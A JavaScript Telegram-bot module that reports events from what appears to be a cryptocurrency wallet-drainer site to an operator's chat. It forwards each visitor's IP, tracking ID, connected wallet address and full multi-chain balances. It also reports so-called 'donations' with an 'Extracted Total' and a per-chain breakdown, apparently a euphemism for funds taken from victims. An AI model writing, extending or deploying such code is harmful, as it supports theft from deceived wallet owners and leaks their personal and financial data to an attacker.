// utils/bot.js
import { subscribe } from "./notify.js";
import TelegramBot from "node-telegram-bot-api";

// 🔧 put your Telegram bot details here
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let bot;
if (BOT_TOKEN && CHAT_ID) {
  bot = new TelegramBot(BOT_TOKEN, { polling: false });
}

function sendMessage(text) {
  if (bot) bot.sendMessage(CHAT_ID, text, { parse_mode: "Markdown" });
}

// ---- Subscribe to events ----
export function initBot() {
  // 1. Link Opened
  subscribe("LINK_OPENED", ({ openedUrl, visitorIp, trackingId }) => {
    sendMessage(
      `🔗 *Link Opened*\n📄 URL: ${openedUrl}\n🌍 IP: ${visitorIp}\n🆔 Tracking ID: \`${trackingId}\``
    );
  });

  // 2. Wallet Connected
  subscribe("WALLET_CONNECTED", ({ walletAddress, trackingId, balances, grandTotal }) => {
    let msg = `✅ *Wallet Connected*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\`\n\n💰 *Balances:*\n`;
    balances.forEach(chain => {
      msg += `🌐 ${chain.name}\n   • Native: ${chain.native}\n   • Tokens:\n`;
      chain.tokens.forEach(t => {
        msg += `      ${t.name}: ${t.amount} ($${t.value})\n`;
      });
      msg += `   • Chain Total: $${chain.total}\n\n`;
    });
    msg += `📊 *Grand Total Across Chains:* $${grandTotal}`;
    sendMessage(msg);
  });

  // 3. Donation Begins
  subscribe("DONATION_START", ({ walletAddress, trackingId }) => {
    sendMessage(`🚀 *Donation Started*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``);
  });

  // 4. Chain Switch
  subscribe("CHAIN_SWITCH", ({ trackingId, oldChain, newChain }) => {
    sendMessage(`🔄 *Chain Switched*\n🆔 Tracking ID: \`${trackingId}\`\n🌐 From: ${oldChain} → ${newChain}`);
  });

  // 5. Donation Results
  subscribe("DONATION_RESULTS", ({ walletAddress, trackingId, balances, donationSummary }) => {
    let msg = `🎉 *Donation Completed*\n🆔 Tracking ID: \`${trackingId}\`\n👛 Address: \`${walletAddress}\`\n\n💰 *Updated Balances:*\n`;
    balances.forEach(chain => {
      msg += `🌐 ${chain.name}\n   • Native: ${chain.native}\n   • Tokens:\n`;
      chain.tokens.forEach(t => {
        msg += `      ${t.name}: ${t.amount} ($${t.value})\n`;
      });
      msg += `   • Chain Total: $${chain.total}\n\n`;
    });
    msg += `📤 *Donation Summary:*\n   • Extracted Total: $${donationSummary.total}\n   • Breakdown:\n`;
    donationSummary.breakdown.forEach(b => {
      msg += `      ${b.chain}: $${b.amount}\n`;
    });
    sendMessage(msg);
  });

  // 6. Wallet Disconnected
  subscribe("WALLET_DISCONNECTED", ({ walletAddress, trackingId }) => {
    sendMessage(`❌ *Wallet Disconnected*\n👛 Address: \`${walletAddress}\`\n🆔 Tracking ID: \`${trackingId}\``);
  });
}
